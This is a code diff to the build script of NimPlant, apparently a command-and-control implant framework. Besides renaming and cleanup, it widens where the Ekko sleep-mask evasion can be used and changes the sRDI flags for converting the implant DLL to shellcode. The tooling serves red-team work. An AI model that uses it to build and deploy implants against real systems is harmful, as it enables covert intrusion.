@@ -11,15 +11,15 @@
 
 import os
 import random
+import sys
 import time
 import toml
-from pathlib import Path
-from client.dist.srdi.ShellcodeRDI import *
+from client.dist.srdi.ShellcodeRDI import ConvertToShellcode, HashFunctionName
 
 
 def print_banner():
     print(
-        """
+        r"""
                   *    *(#    #             
                   **  **(##  ##             
          ########       (       ********    
@@ -62,8 +62,8 @@ def print_usage():
     )
 
 
-def getXorKey(force_new=False):
-    if os.path.isfile(".xorkey") and force_new == False:
+def get_xor_key(force_new=False):
+    if os.path.isfile(".xorkey") and not force_new:
         file = open(".xorkey", "r")
         xor_key = int(file.read())
     else:
@@ -72,8 +72,8 @@ def getXorKey(force_new=False):
             "NOTE: Make sure the '.xorkey' file matches if you run the server elsewhere!"
         )
         xor_key = random.randint(0, 2147483647)
-        file = open(".xorkey", "w")
-        file.write(str(xor_key))
+        with open(".xorkey", "w") as file:
+            file.write(str(xor_key))
 
     return xor_key
 
@@ -123,14 +123,19 @@ def compile_nim_debug(binary_type, _):
 
 def compile_nim(binary_type, xor_key, debug=False):
     # Parse config for certain compile-time tasks
-    configPath = os.path.abspath(
+    config_path = os.path.abspath(
         os.path.join(os.path.dirname(sys.argv[0]), "config.toml")
     )
-    config = toml.load(configPath)
+    config = toml.load(config_path)
 
     # Enable Ekko sleep mask if defined in config.toml, but only for self-contained executables
     sleep_mask_enabled = config["nimplant"]["sleepMask"]
-    if sleep_mask_enabled and binary_type not in ["exe", "exe-selfdelete"]:
+    if sleep_mask_enabled and binary_type not in [
+        "exe",
+        "exe-selfdelete",
+        "dll",
+        "raw",
+    ]:
         print("       ERROR: Ekko sleep mask is only supported for executables!")
         print(f"       Compiling {binary_type} without sleep mask...")
         sleep_mask_enabled = False
@@ -185,7 +190,7 @@ def compile_nim(binary_type, xor_key, debug=False):
 
         # Convert DLL to PIC using sRDI
         dll = open("client/bin/NimPlant.dll", "rb").read()
-        shellcode = ConvertToShellcode(dll, HashFunctionName("Update"), flags=0x5)
+        shellcode = ConvertToShellcode(dll, HashFunctionName("Update"), flags=0x4)
         with open("client/bin/NimPlant.bin", "wb") as f:
             f.write(shellcode)
 
@@ -201,7 +206,6 @@ if __name__ == "__main__":
 
     if len(sys.argv) > 1:
         if sys.argv[1] == "compile":
-
             if len(sys.argv) > 3 and sys.argv[3] in ["nim", "nim-debug"]:
                 implant = sys.argv[3]
             else:
@@ -220,16 +224,16 @@ if __name__ == "__main__":
                 binary = "all"
 
             if "rotatekey" in sys.argv:
-                xor_key = getXorKey(True)
+                xor_key = get_xor_key(True)
             else:
-                xor_key = getXorKey()
+                xor_key = get_xor_key()
 
             compile_implant(implant, binary, xor_key)
 
             print("Done compiling! You can find compiled binaries in 'client/bin/'.")
 
         elif sys.argv[1] == "server":
-            xor_key = getXorKey()
+            xor_key = get_xor_key()
             from server.server import main
 
             try:
